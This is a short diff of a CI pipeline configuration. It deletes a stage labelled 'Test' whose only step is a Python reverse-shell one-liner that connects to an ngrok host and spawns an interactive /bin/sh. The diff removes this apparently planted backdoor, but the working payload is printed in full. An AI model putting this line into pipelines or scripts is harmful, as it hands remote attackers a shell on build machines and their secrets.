@@ -36,10 +36,6 @@ variables:
 pool: Standard
 
 stages:
-  - stage: Test
-    jobs:
-      job:
-        - script: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.tcp.ngrok.io",14675));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   - stage: Sanity
     dependsOn: []
     jobs:
